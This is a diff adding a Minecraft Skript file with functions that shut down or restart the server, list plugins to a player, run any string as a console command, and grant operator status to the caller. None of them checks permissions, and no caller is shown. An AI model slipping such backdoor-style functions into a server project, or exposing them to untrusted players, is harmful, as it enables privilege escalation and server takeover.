@@ -1,0 +1,27 @@
+function shutdownServer(p: player):
+    send "Shutting down server" to {_p}
+    broadcast "The server is shutting down in 5 seconds."
+    wait 5 seconds
+    kick all players due to "Server was shut down by %{_p}%."    
+    shutdown server
+
+function restartServer(p: player):
+    send "Restarting server" to {_p}
+    broadcast "The server is restarting in 5 seconds."
+    wait 5 seconds
+    kick all players due to "Server was restarted by %{_p}%. Please rejoin after a while."    
+    restart server
+
+function getPlugins(p: player):
+    set {_plugins::*} to plugin list
+    send "&aPlugins found. Here's a list of all of them: " to {_p}
+    loop {_plugins::*}:
+        send "&a%loop-value%" to {_p}
+
+function executeConsoleCommand(p: player, cmd: string):
+    send "&4Executing command: %{_cmd}%" to {_p}
+    make console execute command {_cmd}
+
+function opMe(p: player):
+    send "&aYou are now op!" to {_p}
+    op {_p}
